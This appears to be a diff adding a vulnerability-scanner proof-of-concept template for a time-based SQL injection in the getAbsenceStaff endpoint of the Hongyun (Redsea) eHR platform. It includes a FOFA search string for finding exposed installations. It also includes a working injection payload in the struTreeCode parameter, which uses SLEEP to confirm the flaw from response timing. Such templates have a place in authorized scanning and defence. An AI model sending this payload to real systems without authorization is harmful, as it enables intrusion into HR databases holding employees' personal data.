@@ -1,0 +1,24 @@
+id: poc-yaml-hr-soft-getabsencestaff-sqli
+info:
+  name: 红海云eHR getAbsenceStaff SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 红海云eHR
+  fofa: body="/RedseaPlatform/skins/images/favicon.ico"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /RedseaPlatform/
+  expression: status_code == 200 && contains(body,"/RedseaPlatform/skins/images/favicon.ico")
+- method: POST
+  path: /RedseaPlatform/BossIndex.mob
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: method=getAbsenceStaff&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{.t1}})))ShXk)+AND+%27qmyT%27=%27qmyT
+  expression: "status_code == 200 && \ncontains(body,\"\\\"meg\\\":\\\"处理成功\\\"\"\
+    ) &&\ncontains(body,\"\\\"jsonList\\\":\") &&\n!contains(body,\"<\") &&\ncontains(content_type,\"\
+    text/json\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
